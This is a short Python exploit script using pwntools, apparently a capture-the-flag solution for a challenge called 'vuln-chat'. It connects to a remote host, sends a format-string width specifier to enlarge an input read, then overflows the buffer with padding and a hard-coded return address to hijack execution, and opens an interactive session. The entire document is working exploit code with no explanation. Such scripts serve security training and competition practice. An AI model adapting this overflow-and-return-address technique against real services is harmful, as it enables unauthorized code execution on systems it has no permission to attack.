from pwn import *

#r = process('./vuln-chat')
r = remote('vulnchat.tuctf.com', 4141)
r.sendline('A'*20+'%80s')
r.sendline('A'*49+p32(0x0804856B))

r.interactive()
